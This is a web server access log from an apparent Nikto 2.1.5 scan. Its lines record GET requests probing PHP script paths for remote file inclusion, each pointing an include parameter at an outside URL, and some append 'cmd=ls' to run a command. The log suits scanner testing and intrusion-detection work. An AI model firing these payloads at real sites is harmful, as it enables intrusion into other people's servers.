172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /language/lang_english/lang_admin_album.php?phpbb_root_path=http://cirt.net/rfiinc.txt??a= HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005211)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /language/lang_german/lang_admin_album.php?phpbb_root_path=http://cirt.net/rfiinc.txt??a= HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005212)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /language/lang_german/lang_main_album.php?phpbb_root_path=http://cirt.net/rfiinc.txt??a= HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005213)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /latestposts.php?forumspath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005214)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /latex.php?bibtexrootrel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005215)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /layout/default/params.php?gConf[dir][layouts]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005216)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /ldap/authldap.php?includePath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005217)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /learnPath/include/scormExport.inc.php?includePath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005218)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib.editor.inc.php?sys_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005219)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/Loggix/Module/Calendar.php?pathToIndex=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005220)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/Loggix/Module/Comment.php?pathToIndex=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005221)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/Loggix/Module/Rss.php?pathToIndex=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005222)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/Loggix/Module/Trackback.php?pathToIndex=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005223)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/action/rss.php?lib=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005224)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/activeutil.php?set[include_path]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005225)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/addressbook.php?GLOBALS[basedir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005226)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/armygame.php?libpath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005227)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/authuser.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005228)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/base.php?BaseCfg[BaseDir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005229)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/connect.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005230)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/connected_users.lib.php3?ChatPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005231)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/connected_users.lib.php3?ChatPath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005232)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/db/mysql.class.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005233)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/db/postgres.class.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005234)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/functions.php?DOC_ROOT=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005235)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/googlesearch/GoogleSearch.php?APP[path][lib]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005236)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/header.php?DOC_ROOT=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005237)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/language.php?_LIB_DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005238)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/live_status.lib.php?ROOT=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005239)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/misc.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005240)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/nl/nl.php?g_strRootDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005241)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/obj/collection.class.php?GLOBALS[application][app_root]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005242)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/obj/content_image.class.php?GLOBALS[application][app_root]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005243)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/pcltar.lib.php?g_pcltar_lib_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005244)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/pcltrace.lib.php?g_pcltar_lib_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005245)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/rs.php?rootpath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005246)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/selectlang.php?BBC_LANGUAGE_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005247)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/smarty/SmartyFU.class.php?system[smarty][dir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005248)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/smarty/SmartyFU.class.php?system[smarty][dir]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005249)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/static/header.php?set_menu=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005250)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lib/tpl.inc.php?conf[classpath]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005251)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /libraries/comment/postComment.php?path[cb]=http://cirt.net/rfiinc.txt??a= HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005252)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /libraries/database.php?path=http://cirt.net/rfiinc.txt???? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005253)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /libraries/lib-remotehost.inc.php?phpAds_geoPlugin=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005254)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /libraries/pcl/pcltar.php?g_pcltar_lib_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005255)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /library/authorize.php?login_form=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005256)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /library/translation.inc.php?GLOBALS[srcdir]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005257)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /libs/db.php?path_local=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005258)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /libs/ftp.php?path_local=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005259)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /libs/lom.php?ETCDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005260)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /libsecure.php?abs_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005261)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /license.php?CONFIG[MWCHAT_Libs]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005262)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /link_main.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005263)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /linkadmin.php?page=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005264)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /linksnet_newsfeed/linksnet_linkslog_rss.php?dirpath_linksnet_newsfeed=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005265)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /linksnet_newsfeed/linksnet_linkslog_rss.php?dirpath_linksnet_newsfeed=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005266)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /list.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005267)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lms_path/modules/userpanel.php?CONFIG[directories][userpanel_dir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005268)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lms_path/modules/welcome.php?_LIB_DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005269)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /load_lang.php?_SERWEB[configdir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005270)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /load_lang.php?_SERWEB[serwebdir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005271)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /load_phplib.php?_PHPLIB[libdir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005272)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /loader.php?GLOBALS=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005273)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /local/lib/lcUser.php?LIBDIR=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005274)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /log.php?bibtexrootrel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005275)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /login.php3?cl_headers=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005276)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /login.php?base_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 200 1992 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005277)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /login.php?blog_theme=http://cirt.net/rfiinc.txt? HTTP/1.1" 200 1992 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005278)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /login.php?langfile=http://cirt.net/rfiinc.txt? HTTP/1.1" 200 1992 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005279)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /login.php?pachtofile=http://cirt.net/rfiinc.txt? HTTP/1.1" 200 1992 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005280)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /login.php?srcdir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 200 1992 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005281)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /login.php?value=http://cirt.net/rfiinc.txt??? HTTP/1.1" 200 1992 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005282)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lovecms/install/index.php?step=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005283)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /m2f/m2f_cron.php?m2f_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005284)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /m2f/m2f_forum.php?m2f_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005285)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /m2f/m2f_mailinglist.php?m2f_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005286)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /m2f/m2f_phpbb204.php?m2f_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005287)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /maguz.php?site=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005288)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mail/childwindow.inc.php?form=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005289)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mail/childwindow.inc.php?form=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005290)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mail/content/fnc-readmail3.php?__SOCKETMAIL_ROOT=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005291)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mail/content/fnc-readmail3.php?__SOCKETMAIL_ROOT=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005292)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mail_this_entry/mail_autocheck.php?pm_path=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005293)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /main.inc.php?pathtoscript=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005294)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /main.php?config[search_disp]=true&include_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005295)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /main.php?id=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005296)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /main.php?include_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005297)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /main.php?include_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005298)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /main.php?pageURL=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005299)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /main.php?pagina=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005300)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /main/forum/komentar.php?site_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005301)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /main/main.php?pi=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005302)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /main/ppcbannerclick.php?INC=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005303)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /main/ppcclick.php?INC=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005304)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /main_prepend.php?_SERWEB[functionsdir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005305)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mainpage.php?docroot=http://cirt.net/rfiinc.txt??cmd HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005306)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mamboleto.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005307)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mambots/editors/path/jscripts/tiny_mce/plugins/preview/preview.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005308)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /manage_songs.php?foing_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005309)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /manager/admin/index.php?MGR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005310)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /manager/admin/p_ins.php?MGR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005311)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /manager/admin/u_ins.php?MGR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005312)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /manager/articles.php?_PX_config[manager_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005313)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /manager/static/view.php?propID=0&INC=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005314)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /master.php?root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005315)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mcNews/admin/header.php?skinfile=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005316)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mcf.php?content=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005317)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mcnews/admin/install.php?l=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005318)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mediagallery/public_html/maint/ftpmedia.php?_MG_CONF[path_html]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005319)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /member.php?vwar_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005320)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /member.php?vwar_root=http://cirt.net/rfiinc.txt?&cmd=ls HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005321)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /member/usercp_menu.php?script_folder=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005322)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /members/index.php?INC=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005323)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /members/registration.php?INC=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005324)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /members_help.php?hlp=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005325)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /membres/membreManager.php?include_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005326)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /menu.php3?cl_headers=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005327)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /menu.php?functions_file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005328)"
